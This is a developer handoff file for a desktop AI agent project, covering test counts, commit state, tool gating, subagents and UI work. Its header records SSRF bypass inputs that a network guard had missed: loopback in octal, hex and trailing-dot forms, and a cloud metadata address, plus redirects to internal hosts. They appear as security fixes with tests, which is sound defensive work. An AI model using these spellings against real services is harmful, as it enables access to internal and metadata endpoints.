# NEXT_SESSION.md — TONYAgent Handoff

**Project:** TONYAgent — local-first desktop AI agent
**Last updated:** 2026-10-13, after **the documentation-and-layout pass** -- the README and
PROJECT_SUMMARY brought back in line with the pywebview app that actually ships, and the
layout's six breakpoints and five panel insets reduced to one ladder and two tokens.
See "The docs, and one layout instead of six" below.
**Was:** 2026-10-11, after **the adversarial gate pass** — the whole
registered surface swept through the orchestrator, the skill store and the
workflow fan-out probed as hostile input, three gate holes fixed, and the
recorded `_execution_history` leak closed. See "The adversarial gate pass" below.
**41 tools, and every gate is now swept rather than sampled, and three holes it
found are closed.** The mode × permission matrix is checked for all 41 tools on
all 16 combinations, with a recorder in place of every tool body so "refused"
is measured as "the body never ran"; all four destructive tools fail closed with
no bridge, on No, and on timeout; every path parameter of every path-taking tool
refuses four spellings of an escape; all 14 sandbox-required tools answer with
one sentence when nothing is attached; stopping a turn with six children in
flight cancels all of them, leaves no task behind and restores the concurrency
permits; and a *queued* child can be interrupted before its turn starts. What was
actually broken: the network guard raised instead of refusing on an unparseable
URL, allowed three spellings of loopback (`0177.0.0.1`, `0x7f000001`,
`127.0.0.1.`) because it trusted the resolver to *fail*, and allowed the whole
RFC 6598 range including `100.100.100.200` (Alibaba Cloud metadata); the skill
store read an oversized file into memory before refusing it. One latent
order-dependence in the suite was fixed on the way (a plan-mode test left the
process-wide orchestrator in Plan and broke ten later tests), and the one item
that pass had recorded as "purely a leak rather than a policy question" is
closed: `_execution_history` is a 200-entry ring now, because it holds each
call's full arguments (for `write`, the file contents) and nothing ever read it.
**Was:** 2026-10-11, after **Phase 6 (`workflow`) complete: fan-out** —
see "Phase 6 (workflow): what landed, and what remains" below.
**39 tools, and Phase 6 is finished.** A parent turn can now run **several
children at once**: there is no fan-out verb and none was needed — the session
already executes a batch of independent tool calls concurrently, so declaring
three `subagent` calls in one assistant message gets three children, and mixing
`send_message` and `subagent_fork` into the same batch is the same mechanism.
The serial gate that used to refuse that is gone. In its place are **three
explicit bounds, all in `_drive_child`** (the one place a child's turn starts),
all module constants, all pinned by a tripwire test and all mutation-checked:
`MAX_CONCURRENT_CHILDREN = 4` (a *queue* — a verb without a slot waits, so asking
for six children gets six), `MAX_CHILDREN_PER_TURN = 8` (the per-turn spend
backstop, which is what makes the budget answer true — see below), and
`MAX_SUBAGENT_DEPTH = 1` (one level deep, which used to fall out of the serial
gate *by accident* and would have been silently lost with it).
**The budget question is answered in the code, not just in prose.** The parent's
per-turn tool budget *does* bound a fan-out whenever it is set — each verb is one
of the parent's tool calls, counted before it runs — and `MAX_CHILDREN_PER_TURN`
is the backstop for when the user has set it to `0`, which means "no limit".
What is deliberately *not* bounded is what the children spend: each child's
budget is still its own, the Phase 5 decision, unchanged.
Re-measured: **Python 1053 passed / 11 skipped** (`-m "not docker"`, 70s),
TypeScript **608 passed** (99 suites), e2e **54 checks, 0 failed**, typecheck +
build clean. The three tool-safety holes from the tool-safety pass are still
closed and still covered.
**Was:** 2026-10-11, after **Phase 6's first slice** — `send_message`,
`subagent_fork`, the re-entrant loop, and two pieces of ownership debt.
**39 tools**. **A child can be talked to again, and copied.** The child session
loop is *re-entrant*: `send_message` gives an existing child another turn on
the transcript it already has, and `subagent_fork` copies that transcript into a
new child and leaves the original alone. All three spawning verbs go through one
loop (`subagent_tools._drive_child`) — the verbs differ in where the child comes
from, not in how it runs. Attribution is **per turn, not per child**: each turn
stamps the id of the call that asked for it, so a follow-up's frames are drawn
under the `send_message` card and not under the `subagent` card that created the
child (the reducer routes by call id and never by tool name — pinned on both
sides). The ownership debt this phase touched is fixed too: the function-local
`AgentSession` import is gone (a child is built from `type(parent)`), and
`shell_tools`' **two parallel gating booleans** (`_ALLOWLIST_BYPASS`,
`_HOST_EXECUTION`) are replaced by **one permission** published in the tool
context around each call. The real-turn test found a real bug on the way:
`final_answer` returned the *previous* turn's text when a follow-up produced
none; it now reads only from the transcript this turn wrote.
**Was:** 2026-10-11, after **the tool-safety pass** — see "The confirmation
gate, and the redirect the guard missed" at the end.
**37 tools**. **Three measured tool-safety holes are closed, each with a test that
fails on the previous code.** The internal-address guard is now applied to *every*
hop of a request (an httpx request hook), so a public page answering
`Location: http://127.0.0.1:...` no longer hands back the body of a loopback or
cloud-metadata address — measured both ways with a local listener and a public
redirector. A destructive tool with no confirmation bridge installed is **refused**
instead of run unasked (`delete_file` used to report `success` with the file gone).
And the confirmation lifecycle terminates: the pending entry is dropped in a
`finally`, Stop answers the prompt, and a turn that ends with one outstanding
publishes `confirmation.resolved` while the reducer clears `pendingConfirm` with the
turn — so no Allow/Deny outlives its turn and no tool sits out the 60-second wait.
Re-measured: **Python 1029 passed / 11 skipped** (`-m "not docker"`, 44s),
TypeScript **606 passed** (99 suites), e2e **50 checks, 0 failed**, typecheck +
build clean.
**Was:** 2026-10-11, after **the nested subagent UI** — see "Nested
subagent work" at the end.
**37 tools**. **A subagent's work is now visible in the window.** A child's
frames carry its name and the id of the parent tool call that spawned it
(`Event.subagent` / `Event.parent_call_id`; the orchestrator records the
executing call in a `ContextVar`, which a parallel batch needs), and the
reducer routes them into that call's card instead of the turn lifecycle: the
card grows a nested block — the child's tools, its answer, its running state —
and nothing of the child appears as the assistant's own message. This was
checked as pixels, not only as assertions: `app/nested-preview.html` mounts the
real `MessageList` against the real stylesheets, and the look was confirmed in
the browser (screenshot and notes at the end). **Phase 5 is now complete in its
synchronous form**: `subagent`, the registry, the two control verbs, the
restart wiring, and the nested view. Peer messaging (`send_message`) and
`subagent_fork` remain Phase 6, and **no phase beyond 5 has been started**.
Re-measured: **Python 1019 passed / 11 skipped** (`-m "not docker"`, 42s),
TypeScript **604 passed** (99 suites), e2e **50 checks, 0 failed**.
**Was:** 2026-10-11, after **the pass that closed the two Phase 5 handoff
items: the registry hole and the live-window question** — see "The registry's
children, and the child's frames" at the end.
**37 tools**. **The registry hole is closed**: `SubagentRegistry.restart()` existed but
nothing called it, so switching conversations left the outgoing chat's children listed
in the new chat's `list_agents` and left a running child running.
`headless/server.py::_attach_session` now drops them — the one host path every session
replacement goes through (switch, new chat, startup restore) — pinned by a registry test
and two protocol tests. **The live-window question is answered, and answering it found
and fixed two real window bugs.** Nobody had watched a real child in the real window, so
instead of guessing, this pass captured the exact frame sequence a real child puts on the
bus (`scripts/capture_child_frames.py` — a real parent turn calling `subagent` against a
stub provider) and replayed it through the reducer. The child's answer had been rendering
as an *extra, unlabelled assistant bubble*, and the child's `turn.finished` cleared `busy`
while the parent was still working — re-enabling a composer the core would refuse with "a
turn is already running". `events.ts` now tracks the window's own turn (`activeTurnId`)
and ignores frames belonging to any other turn, on the creation, terminal and error paths;
the App clears that id wherever it replaces the transcript. Three reducer tests replay the
captured sequence verbatim. **What is still not watched: the live GUI with a real
provider** — the frames and the reducer are now pinned by capture + test, but no human has
seen a real child in the running window. That check remains the first thing to do with a
real provider bound (see the end of this file).
Re-measured: **Python 1016 passed / 11 skipped** (`-m "not docker"`, 42s), TypeScript
**596 passed** (98 suites), e2e **50 checks, 0 failed**.
**Was:** 2026-10-11, after **Phase 5's first slice (the `subagent` tool)**.
**37 tools**. Subagents exist: `subagent` delegates self-contained leaf work to a
real child `AgentSession` inside the parent's turn (serial, one at a time), and
`list_agents`/`interrupt_agent` observe and stop them. The child inherits its
parent's mode/permission/budget and shares the provider object; it runs its own
turn on its own turn-id — which is what keeps its frames out of the parent's
transcript — and its `set_state` is *not* used (a plain assignment), because that
path publishes to the process-global the parent's prompt reads. Runtime error
paths the user asked to be audited are unit-tested: child timeout (cancelled and
said), provider failure inside the child (a readable error, not a crash), and
`interrupt_agent` reaching a live child (the call answers `ERROR` in words, not a
raised `CancelledError` — the shield's inner-vs-outer cancel discrimination is
the subtle bit, commented at the site). Every refusal is an `ERROR` ToolResult in
model-actionable language. Read **"Phase 5 (subagents)" below for where the
design actually landed versus what was written here before** — the synchronous
core of this phase is done; peer-messaging and `subagent_fork` remain Phase 6
work, and the schema/advice layer (frontend visibility in `ToolRow`) is untouched.
Re-measured: **Python 1013 passed / 11 skipped** (`-m "not docker"`, 42s), e2e
**50 checks, 0 failed** (three new subagent refusals included).
**Was:** 2026-10-11, after the post-Phase-4 small items and Phase 5 groundwork —
fix-ups committed (`8b6e2d7`), the six inert confirmation flags gone (`66f99ff`),
array-item validation (`67942d9`), construction no longer repoints the global
`task_state` (`2da7e4d`). **34 tools.**
**Was:** 2026-10-11, after the Phase 4 review — see "The `user_io` leak, and
what it cost" at the end. Phase 4 is committed as `d4e66b9`; three fix-up files
were uncommitted (now committed, see "Last updated"). The 60s-per-ask stall that
made a single pytest process appear to die at 64% is diagnosed and fixed, and
the suite was 966 passed in 41s. **34 tools**.
**Was:** 2026-10-11, after Phase 4 of the tool port — see
"`ask_user_question` and `present`" at the end, and read "The tool system, as it
stands" in §0 first. The agent can now reach the *user* mid-turn: one tool asks
a question and waits for an answer, one shows something and waits for it to be
read, and the window answers both through one new method (`user.respond`). One
event pair (`user.asked`/`user.resolved`), one dialog, one timeout, and the two
tools fail differently on purpose — a question nobody answers is a failed call,
a presentation nobody answered was still delivered. **34 tools.**
**Was:** 2026-10-11, after the tool-system and planning passes — see the
last two sections, "The tool system" and "The plan and the goal", and read
"The tool system, as it stands" in §0 first. Tools are declared once instead of
twice, a malformed call is refused
in words the model can act on instead of failing inside a tool, the independent tool
calls in one message run at the same time, `read`/`write`/`edit` are the file tools
(`read` takes a line window, `edit` refuses an ambiguous match), `read_image` and
`web_fetch` are new, long-running commands can be started as background jobs with
`job_list`/`job_output`/`job_kill`, and a `ToolResult` carries the one-line
`summary` a tool card needs, and the agent keeps a task list and a goal that are
saved with the conversation. **32 tools.**
**Was:** 2026-10-10, after the tab strip -- see "The tab strip" at the
end. The title bar is a strip of tabs now: one per open chat, an X on each, a "+"
after them, and a right-click for Rename and Close tab. Rename is refused on a
chat with no messages, because the core names a chat from its first message.
**Was:** 2026-10-10, after the title bar's tab -- see "The tab, and what
deleting a chat left behind" at the end. The open chat's name is a browser tab now
-- the bar's full height, square at the bottom -- and deleting the open chat no
longer leaves the window on no conversation at all, which was losing every message
typed afterwards.
**Was:** 2026-10-10, after the folder system -- see "One folder at a
time" at the end. One project folder at a time, chats bonded to folders, and
changing the folder takes the open chat with it. Following the feature's own
symptom found something much larger: **no reply from the core had ever reached
the window** since the pywebview migration.
**Was:** 2026-10-10, after the sidebar's foot -- see "The sidebar's foot"
at the end. The settings button was not at the bottom of the sidebar because the
only element that could push it there is not rendered when the conversation list
is empty -- and Clear, a trash glyph that read as "delete this chat", is gone.
**Was:** 2026-10-10, after the rail's mark -- see "The rail's mark is
gone" at the end. The app's glyph was being drawn twice, 22px in the title bar's
corner and 32px in the rail, and the rail's copy was a leftover from the move to
the corner. The rail's own test asserted it *drew* the mark, so it was green the
whole time the window had two logos.
**Was:** 2026-10-10, after the app's shortcut -- see "The shortcut, and
one window instead of two" at the end. Making a shortcut meant looking at what it
would open, which turned out to be two windows: the app had its own console.
The launcher starts `pythonw` now, and the host keeps its log in a file instead.
**Was:** 2026-10-10, after the window's corners and the settings
gear -- see "The window's corners, and the settings gear" at the end. The
corners were square while the code that rounds them ran without complaint; the
gear was an outline that read as a sun. Both are fixed and both were measured.
**Was:** 2026-10-10, after the app's mark moved to the window's
top-left corner -- see "The mark moved to the window's corner" at the end. The
sidebar's head is the toggle alone now, and the title bar's indent is the
mark's own width rather than a padding.
**Was:** 2026-10-10, after the move out of Tauri -- see
"Tauri -> pywebview: the shell is Python now" at the end. The Rust crate, the
frozen sidecar and the Windows SDK are gone. The window is
`python -m tonyagent.window`, the core is its child process, and the frontend
reaches it through `window.pywebview.api` instead of `invoke`. The JSONL
protocol, every component and all 21 stylesheets are unchanged.
**Was:** 2026-10-05, after the modal's scrollbar — see
"설정 모달의 스크롤바가 모서리 밖으로 나가던 것" at the end. The dialog's
scrollbar painted 7px of its thumb outside the panel's rounded corners at
either end of its travel; the track is now inset there. That fix costs 7.2%
of scroll-fraction accuracy, which is stated plainly in that section.
**Was:** 2026-10-05, after the settings panel's vertical
rhythm — see "설정 패널: 필드 두 개가 붙어 있던 것" at the end. The Base URL
field sat 0px under the provider dropdown, reading as one field with a rule
across it; `.settings-row ~ .settings-row` now puts the same 10px between two
fields that the panel already puts between a note and a field.
**Was:** 2026-10-05, after the layout sweep — see
"레이아웃 스윕: 읽기 칼럼 하나, 그리고 설정 패널" at the end. The composer and
the messages now start on one text column (`--column-inset`), the settings
panel's fields share one inset and one shape, the status bar's separators
draw something, and the Logs strip sits in the composer's column.
**Was:** 2026-10-04, after the screenshot tool, paste-to-queue
and a real CSP bug that had been breaking every attachment preview — see
"스크린샷 도구, 붙여넣기 미리보기, 그리고 깨져 있던 CSP" at the end.
`take_screenshot` lets the model see the screen it runs on; pasting an
image queues it; and `tauri.conf.json` had no `img-src` at all, so no
data: preview had ever rendered.
**Was:** 2026-10-04, after the centred project-folder button — see
"가운데 폴더 버튼" just above section 2. The empty-chat panel now names the
project folder in the middle and offers one Change... button; leaving it
alone keeps the folder you had.
**Test totals:** Python unit **1158 passed / 13 skipped** (`-m "not docker"`, in one
process), TypeScript **626 passed** (103 suites), and `scripts/e2e_all_tools.py --fast`
**66 checks, 0 failed** across all **41 tools**. This line read "1029 / 606 / 50 checks /
37 tools" until it was re-measured after the gate pass, and it sits directly above a
`Status` that gave different figures again — which is how the two came to disagree.
`tests/unit/test_build_scripts.py` was
rewritten for the
one-stage build, and the flake it was documented as having turned out to be a
millisecond-wide margin in its own fixture -- see the end of this file.
**Was:** 2026-10-04, after the visual design sweep — see "Pass: the
visual design sweep" for every current value and where it came from
**Was:** 2026-10-03, after the seventh pass — Permission and
Thinking moved into the settings panel as one shared menu, and the conversation
panel got the scrim that made it read as an overlay (see "The seventh pass"
at the end)
**Was:** 2026-10-02, after the sixth pass — a four-rung
permission bar above the composer (see "The sixth pass" near the end)
**Was:** 2026-10-02, after the fourth UI pass — rounded window corners
from DWM, and the conversation list turned from a docked column into an
animated overlay panel (see "The fourth UI pass" near the end)
**Status:** Core is UI-independent and fully tested. The shell is **pywebview**
(`python -m tonyagent.window`), which starts the core as a child process and talks to
it over the JSONL protocol; `app/` is the React page it renders. The Tauri crate and
the Tkinter UI are both **gone from the source**.
Re-measured 2026-10-11, after the adversarial gate pass: **Python 1158 passed /
13 skipped** (`-m "not docker"`, one process, 53s), **TypeScript 626 passed** (103
suites), `scripts/e2e_all_tools.py --fast` **66 checks, 0 failed** (the 58 of the
Phase 7 pass plus 8 live gate checks), typecheck and `npm run build` clean, and
**41 tools**. (After the Phase 7 (skills) pass: 1106 / 12, 626 TypeScript, 58
checks. After the Phase 5 slice: 1013 / 11, 593 TypeScript, 50 checks, 37 tools.) Note `scripts/check_all.py --fast` is *not* a no-Docker check despite the
name: it runs the whole suite and reports one failure from
`tests/integration/test_docker_backend.py` when the daemon is down.

**Everything through Phase 4 is committed, as `d4e66b9`** — "Let the agent ask you a
question, and wait for the answer". That one commit is deliberately large: it absorbed
the whole Tauri → pywebview migration, the removal of the Tkinter UI
(`src/tonyagent/ui/` and `src/tonyagent/__main__.py` are deleted), the usage ledger,
named API keys, the window host, the tool-system pass and the planning pass — 222
files — because `user_tools` imports the new tool base and registers beside
`planning_tools`, so Phase 4 could not have been committed on its own. **Its commit
message is the account of that work and is worth reading before this file.**

**The Phase 4 review's three files were committed** as `8b6e2d7` — the `user_io` reset
fixture, the `describe()` `asks_user` correction, and this file.

**Everything after `5abe725` is uncommitted — three phases' worth.** `git log -1` is
`0926127`, a **documentation-only** commit ("Hand off Phase 5's first slice"), and the
tree on top of it holds the rest: Phase 6 (the workflow fan-out), Phase 7 (skills), the
adversarial gate pass, the `ToolContext` refactor and the nested-UI rendering. Counted:
**48 entries — 33 modified, 15 new — at ~4,100 insertions / ~570 deletions.**
`git ls-tree HEAD` contains `subagent_tools.py` and *nothing else* of it:
`core/skills.py`, `tools/skill_tools.py`, `tools/context.py`, `tools/workspace.py` and
`app/src/SkillPicker.tsx` are untracked, and the gate fixes in `network_tools.py` are
unstaged. So **`HEAD` is Phase 5, slice one, and the working tree is the only copy of
everything after it** — there is no stash.

**Commit before starting anything else**, and prefer several commits to one: the areas
are separable (workflow, skills, the gate pass, `ToolContext`, the nested UI) and each
carries its own new tests. Note that the earlier versions of this section said "two
passes, ~600 insertions" and "three passes" — both were written before Phase 6 and 7
landed, so neither describes what is actually here. They are replaced by this.

**Five untracked files are development scaffolding, not product code:**
`app/nested-preview.html`, `app/skills-preview.html`, `app/src/nested-preview.tsx`,
`app/src/skills-preview.tsx` and `scripts/capture_child_frames.py`. Nothing in the
product or the build reads them — `vite.config`, `package.json` and both tsconfigs never
mention them, and the preview harnesses say in their own headers that they are opened by
hand from `npm run dev`. This repo already ignores `design-preview/` for exactly this
reason, so either delete them or add them to `.gitignore`, because `git add -A` will
otherwise commit them. **`app/src/SkillPicker.tsx` and `SkillPicker.test.tsx` are not in
this group** — that is real product code, imported by `Composer.tsx` and typed by
`App.tsx`.

**The 590/501 figures below are from the 2026-10-03 run and were NOT re-measured
this pass** — `pytest tests -q` needs Docker Desktop, which was not running here.
What was re-measured is `pytest tests/unit -q`: **616 passed, 7 skipped**. Treat
the integration numbers as historical until someone with the daemon re-runs
them.

For the record, from that earlier run: `pytest tests -q` reports **590 passed, 7
skipped** with Docker Desktop running. With the daemon stopped it is **501 passed,
1 failed, 7 skipped**, and the one failure is
`tests/integration/test_docker_backend.py::test_start_ping_exec_stop`. That is the
environment, not a bug: the test starts a real container.

Ten phases of work landed since the MSVC blocker was cleared:

| Phase | What it did |
|---|---|
| 1 | Folder picker, settings panel, provider binding, sandbox start/stop. All three greyed rail icons went live |
| 2 | `key.save`/`key.delete` (OS keyring, with a real no-leak design) and a `search` method that delegates to the agent's own grep |
| 3 | The four composer modes became real permissions, and the Files tree reports diffs the core measured instead of counting tool calls |
| 4 | Assistant text is rendered as Markdown, parsed to a token tree and built as React elements so untrusted model output never becomes raw HTML |
| 5 | The model field is free text (OpenRouter's namespaced ids, any self-hosted gateway) and `bind_provider` accepts an optional `base_url`, which is what makes the `custom` provider reachable from the UI at all |
| 6 | The conversation list, saved to disk, with "New chat" that means a new one |
| 7 | Anthropic and Gemini dropped; OpenRouter is the only dialect left |
| 8 | Reasoning kept on its own channel through to stored conversations |
| 9 | The thinking panel, and an effort dial chosen per model |
| 10 | A conversation can be named, copied, and found again |

These phases were written against the Tkinter UI, which is no longer in the source:
the shell is `tonyagent.window` (pywebview) and the Tkinter modules are gone. See
sections 1.3-1.6 and 1.13-1.17 for what each phase changed and why.

---

## 0. Read this first

### How to run

```bash
cd C:\Users\iig2y\Desktop\TONYAgent

# The window. The core is its child process, so there is no sidecar to build.
python -m tonyagent.window

# The frontend alone, against a dev server
cd app && npm run dev
```

`Start TONYAgent (Prebuilt).bat` is the entry point worth having: it rebuilds the
frontend when it is behind, checks that `pywebview` is installed, and then opens the
window. `TONYAgent.lnk` (or `scripts\make_shortcut.ps1`) is that same batch file.

**This section used to say `python -m tonyagent` and `npm run tauri:dev`.** Neither
is a command any more: the package has no `__main__.py` (`python -m tonyagent`
exits with "cannot be directly executed" -- a stale `.pyc` for the deleted file is
still in `__pycache__`), and Tauri was removed when the shell became pywebview. The
Tkinter GUI is gone from the source entirely; the six `Tkinter` mentions left in
`src/` are comments explaining what used to depend on its `after()` loop.

### How to verify (run all of these before trusting a change)

```bash
python -m compileall -q src            # syntax
python -m pytest -m "not docker" -q    # 1158 passed, 13 skipped -- no Docker needed
python -m pytest tests -q              # adds tests/integration; needs Docker Desktop
python scripts/check_all.py --fast     # compileall + the FULL pytest run -- see the note below
python scripts/e2e_all_tools.py --fast # 66 checks: every tool, incl. fail-closed refusals (no sandbox needed)
python scripts/e2e_all_tools.py        # same + real Docker sandbox + browser round-trip

cd app && npm test                     # 626 passed (protocol, reducer, markdown, components, stylesheet cascade)
cd app && npm run typecheck            # whole app, incl. React components
```

**`scripts/check_all.py --fast` is not a no-Docker check, and it is 2 checks rather
than 3.** It runs `compileall` and then the *whole* pytest run, integration tests
included, so without Docker Desktop it reports `1 failed` — that is
`tests/integration/test_docker_backend.py::test_start_ping_exec_stop`, which is the
environment and not a regression. The GUI launch is exactly what `--fast` skips, so
"3 checks incl. GUI launch" was never true of this invocation. Prefer the two pytest
commands above: they differ only in whether the daemon is needed, and they say which.

`npm run build` runs `tsc --noEmit && vite build`, so a type error in a
component fails the build. `npm test` is `tsc -p tsconfig.test.json && node
--test ".tmp/**/*.test.js"` — one compile, one glob, and the test files are
never named in `package.json`. The compile extends the app's own `tsconfig.json`,
so the tests are typechecked under the same rules as the app they test
(verified: an unused local in a test file fails the build). It is what keeps
the suite runnable without Tauri or Rust installed.

**Component tests need two things the protocol tests do not.** `test-dom.ts`
installs a jsdom window on the Node globals, and it has to be its own module
imported *first* — react-dom decides whether it is in a browser at import
time. And every relative import in a component now carries a `.js` extension,
because Vite resolves without one and Node does not.

**Assert on counts, not on nodes.** `assert.equal(query, null)` makes node:test
serialise the whole jsdom element to build its failure message, which took 91
seconds on a single assertion. `assert.equal(all(c, ".x").length, 0)` fails the
same way and reads instantly — the whole suite runs in about 2s.

**One test in the TypeScript suite is flaky on Windows.** The four
`ComposerAttach` strip tests ("a text file is named rather than previewed",
~~`ComposerAttach` drops in roughly one full run out of five, with `0 !== 1` on
the `.attach-item` count — the async file read has not landed yet.~~ **Fixed.**
The cause was in the test, not the component: `click()` dispatched the event and
returned before React had flushed the resulting state, so the assertion read the
pre-update tree. `test-render.ts` now flushes inside `act` before handing back.
Four consecutive full runs are 444/444.

**Read the stylesheet through `stylesheet.ts`, never from `styles.css`.**
`styles.css` is now an entry that `@import`s 21 modules out of `app/src/styles/`
and declares no rules itself, so reading it directly finds an import list and
nothing else. `readStylesheet()` returns the concatenation in cascade order and
`readStylesheetSource()` the same with comments stripped — those are the only two
readers, and all five call sites use them.

**A test that reads the stylesheet must strip the reduced-motion block too.**
`audit_reduced_motion.py` requires every animation to be cancelled under
`@media (prefers-reduced-motion: reduce)`, so `.sidebar`'s last declaration
*is* `animation: none`. A reader that only removes comments resolves `.sidebar`
to its animation and fails any assertion about its `top`. Strip both; see
`reducedMotion.test.ts` for the pattern.

**Run the suite with the daemon actually stopped** (`e2e_no_docker.py` did
exactly this; the script is gone and its result is recorded here). It prints a
warning and still passes if a daemon is reachable, so a green run against a
running Docker proves nothing about the thing it exists to check.

**The Tk flake is fixed.** `test_phase4_ux.py` used to fail in roughly two
full-suite runs out of four -- a *different* test each time, always with
`invalid command name "tcl_findLibrary"`. The cause was the fixture, not Tcl
and not the layout: it created and destroyed a real root per test, and
`MainWindow` leaves two `after` callbacks behind, one of which reschedules
itself every 5s. Destroying the root stranded them against a finalised
interpreter, and whether the *next* `Tk()` then failed was a race. The module
now shares one root and tears down only its own widgets, cancelling the queued
callbacks. Verified 4/4 full-suite runs, 6/6 file runs, and 15/15 on the two
tests that used to be the usual casualties. Section 8 has the full account.

`check_all.py` without `--fast` opens a real window and will exceed a 30s
command timeout. Use `--fast`, then run the launch check separately.

### Architecture in one picture

```
        window/ (pywebview)  — owns the native window and the core child process
              ^
              |  window.pywebview.api  +  window.__tonyAgent.onFrames(...)
              v
        app/ (React page, built by Vite, rendered in the webview)
              ^
              |  JSONL on stdin/stdout
              v
        headless/server.py  ---->  AgentSession  ---->  events
        (the RPC surface)          (core/session.py)    (core/events.py)
                                         |
                                         +--> LLMClient   (api/)
                                         +--> providers   (providers/)
                                         +--> tools       (tools/)
                                         +--> task_state  (core/task_state.py)
                                         +--> sandbox     (sandbox/)
```

The core imports **no GUI toolkit**. That is enforced by a test, not by
convention — see §6.

### The tool system, as it stands

**41 tools.** The invariants below are the ones that fail *silently* when broken, so
they are worth reading before touching anything in `src/tonyagent/tools/`.

* **A tool is declared once**, on its `Tool` subclass (`tools/base.py`, `describe()`).
  `tools/schemas.py` *derives* the advertised list from the registry instead of
  restating it; it used to be a hand-written second copy of all 23 declarations, and
  a tool missing from it was a tool the model was never told about. Because the
  derivation is lazy, **the import order in `tools/__init__.py` is load-bearing** —
  reaching for `ALL_SCHEMAS` before the tool modules are imported binds an *empty*
  list, which raises nothing anywhere and presents as a model that refuses to act.
* **`validate_args` validates and never coerces** — type, enum and unknown keys,
  honouring each schema's `additionalProperties`. It does **not** recurse into array
  `items` yet, so a tool with an array argument validates its own items (see
  `planning_tools.TodoWriteTool`).
* **The registry is what runs a tool; `schemas.py` is what advertises it.** The
  tripwire in `tests/unit/test_tool_wire_format.py` asserts the Build-mode count, so
  adding a tool means changing one number on purpose rather than by accident.
* **Mode and permission intersect** (`core/modes.py`). The orchestrator enforces it;
  filtering the schema only advises the model.
* **Tool cards need a *string*.** The window reads `result.summary` first (then
  `message`, `output`, `stdout`, `error`) and only accepts a string — so a tool whose
  `output` is a structured dict must set `summary` or it renders a blank card with no
  error anywhere to say so.
* **Adding a tool needs no frontend work.** Rendering is generic over the payload;
  `test_tool_wire_format.py` and `test_tool_summary_line.py` cover the two contracts
  that matter.
* **`list_skills` and `run_skill` are reads, and that is the design.** Skills are
  Markdown files under `.tonyagent/skills/` and under the app-data root; a procedure
  *describes* work that is then done with the tools the turn already has, so both verbs
  sit in the read-only set and exist in Plan and Skills as well as Build. `core/skills.py`
  owns the file format and the `/name` resolution. See "Phase 7 (skills)" below.

### What is left, in the order it is worth picking up

Items 2–4 are closed, the nested UI included; what remains of item 4 is **Phase 6
(`workflow`)** — peer messaging and `subagent_fork` (see below).

1. ~~**Commit the three uncommitted files**~~ — **done** as `8b6e2d7` (the `user_io`
   reset fixture, the `describe()` `asks_user` correction, and this file).
2. ~~**The six tools that can never prompt**~~ — **done** as `66f99ff`. The decision
   went the way the list guessed: the six dropped the inert flag and the gate is
   unchanged. The reasoning is written into the comment block above the browser
   tools in `browser_tools.py` (why not widen the gate instead: `execute_js` is in
   the read-only set reachable from Plan, and Plan's whole design is a sweep that
   runs unattended; a prompt before every `browser_click` is a browser the user has
   to baby-sit; these tools' real gates are `sandbox_required` and
   `isolation_required`, which the destructive prompt never was).
   `test_no_tool_claims_confirmation_without_destructive` in `test_local_sandbox.py`
   pins the invariant registry-wide.
3. ~~**`validate_args` does not recurse into array `items`**~~ — **done** as
   `67942d9`. Array items are now checked one level deep: declared type, enum,
   unknown fields and required fields, numbered by index so a model can find its
   typo. Deliberately shallow — the two `items` users (`todo_write`,
   `ask_user_question`) are flat, and wider recursion waits until a schema
   advertises it. The real `todo_write` invented-field case is pinned against the
   real registry.
4. **Phase 5: subagents.** **First slice landed** — the `subagent` tool, the
   registry behind it, and the two control tools. See "Phase 5 (subagents)"
   below for the design as it now stands: what is real (a child session, its own
   budget and mode, serial execution inside the parent's turn, tested failure
   paths), what was *not* built (peer messaging, `subagent_fork`), and where the
   seam actually landed instead of where this section guessed.
   **Phase 5 is complete in its synchronous form.** The registry is dropped on a
   conversation change (`_attach_session`), the child's frames were captured from a
   real run and pinned by reducer tests, and the nested UI is built: a child's work
   renders under the card of the call that spawned it. What remains open is the
   live GUI check with a real provider (below, and at the end of this file).
   **Phase 6 (`workflow`) then landed**: the re-entrant child loop, `send_message`,
   `subagent_fork`, and the `ToolContext` that owns "what is this call part of".
   See the Phase 6 section below for what is real and what remains.
5. **`exit_plan_mode` is still not built**, and Phase 4 sharpened the reason: it needs
   an approval affordance that can *act on the mode*, and no tool can reach the mode.
   `present` can show a plan and collect a reply, but `set_mode` clears the
   conversation, so approving a plan through it would delete the plan being approved.
   Full reasoning at the end of this file.
6. **Background jobs are host-only.** `execute_command(background=true)` is refused in
   the sandbox because the container is driven by a one-shot `exec_command` RPC that
   keeps no handle to poll. New RPC methods in `docker/sandbox/rpc_server.py` **and a
   container rebuild**, so it cannot be tested without Docker.

~~Phase 6 (`workflow`) and Phase 7 (skills) follow Phase 5.~~ **Both have landed**
(see "Phase 6 (workflow)" and "Phase 7 (skills)" below); what is left of the roadmap
is `exit_plan_mode` (item 5) and the sandbox-side background jobs (item 6), neither of
which is blocked on a phase. **Phase 5's
first slice is what `workflow` was built against**: a subagent exists, has a name, a
budget, a state, and a final answer. What `workflow` added is the re-entrant session
loop — the thing that made `send_message` (a child you may talk to again) and
`subagent_fork` (a conversation you may copy) mean something, plus orchestration over
several such children. The serial child built in `5abe725` is the floor, not the shape,
of that phase: it answers once and finishes, deliberately.

### Phase 5 (subagents): what landed, and what the next session picks up

**The first slice is real and tested** (commit `5abe725`): the `subagent` tool, a
registry, and two control verbs. What follows is what is already decided (so the
next session does not relitigate it) and what is genuinely open (so the next
session starts there instead of at the top).

* **`ToolContext` comes first, and it is not optional this time.** It was deferred out
  of Phase 0 on the agreement that it be built when a real consumer forced its shape;
  a child session is that consumer. The globals to replace are
  `folder_manager.current_folder` (reached directly by `file_tools`, `shell_tools`,
  `search_tools`), and `shell_tools._ALLOWLIST_BYPASS` / `_HOST_EXECUTION` — which
  `ToolOrchestrator.set_permission` *pushes into that module* precisely because a tool
  cannot read the permission level. `jobs_registry` is the same kind of global and is
  the precedent to either follow or fix.
* **A child is an `AgentSession`, and the parent must not see its messages.**
  `AgentSession` owns `messages`, `_cancel`, `_tool_calls_used`, `max_tool_calls` and
  `state`. Two publishes were the hijack and **both are closed**: construction's
  `set_current_state` (`2da7e4d`), *and — found while building the tool —*
  `spawn`'s own `set_state` call, which is the same global publish one layer up:
  the child keeps its state by plain assignment instead (`tools/subagent_tools.py`,
  commented at the site). The child's frames reach the window over the shared bus
  but carry the child's own `turn_id`, so the reducer appends them to the child's
  message, not the parent's — pinned in `test_child_events_say_they_are_the_childs`.
  The parent never reads the child transcript directly: only `final_answer()`,
  which returns the child's last assistant text, lives in the tool result.
